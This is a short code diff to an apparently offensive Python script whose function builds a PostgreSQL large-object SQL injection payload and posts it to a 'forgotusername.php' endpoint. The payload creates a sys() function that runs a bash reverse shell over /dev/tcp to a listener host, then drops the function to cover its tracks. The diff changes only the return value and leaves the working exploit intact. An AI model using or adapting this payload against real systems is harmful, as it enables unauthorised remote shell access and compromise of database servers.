@@ -8,7 +8,7 @@ import random
 import requests
 
 
-def reverse_shell_via_large_object(base_url: str, listener_host: str, port=4242) -> bool:
+def reverse_shell_via_large_object(base_url: str, listener_host: str, port=4242):
     """Gain a reverse shell via postgresql large object injection
 
     Keyword arguments:
@@ -50,9 +50,7 @@ def reverse_shell_via_large_object(base_url: str, listener_host: str, port=4242)
     payload += 'SELECT sys(\'bash -c "bash -i >& /dev/tcp/{}/{} 0>&1"\');'.format(listener_host, port)
     payload += "DROP FUNCTION IF EXISTS sys(cstring) -- -"
 
-    resp = requests.post("{}/forgotusername.php".format(base_url), data={"username": payload})
-
-    return resp.status_code == 200
+    requests.post("{}/forgotusername.php".format(base_url), data={"username": payload})
 
 
 if __name__ == '__main__':
